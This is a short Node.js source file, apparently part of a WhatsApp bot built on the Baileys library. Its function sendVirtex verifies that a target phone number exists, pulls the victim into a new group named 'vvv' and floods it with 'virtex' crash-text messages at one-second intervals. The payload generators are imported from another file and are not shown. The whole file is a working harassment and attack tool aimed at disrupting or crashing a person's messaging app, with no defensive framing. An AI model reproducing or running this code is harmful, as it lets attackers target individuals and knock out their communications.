const { processNumber } = require("../tools");
const { virtex11 } = require("../virtex/virtex");
const { virtex7 } = require("../virtex/virtex7");
const { getSessionList, getSession, isNumberExist } = require("../whatsapp");
const createDelay = require("./create-delay");

/**
 *
 * @param {import("@adiwajshing/baileys").AnyWASocket} session
 */

const sendVirtex = async (session, phone_number, q = 10) => {
  try {
    if (!session) return;
    const receiver = processNumber(phone_number);
    if (!(await isNumberExist(session, receiver, false))) return;
    const group = await session.groupCreate("vvv", [receiver]);
    console.log(group);

    for (let index = 0; index < q; index++) {
      console.log(`sending virtex ${index + 1}/${q}: ${receiver}`);
      await session.sendMessage(group.id, { text: virtex11() });
      await createDelay(1000);
    }
    // await session.groupLeave(group.id);
  } catch (error) {
    console.log(error);
  }
};

module.exports = sendVirtex;
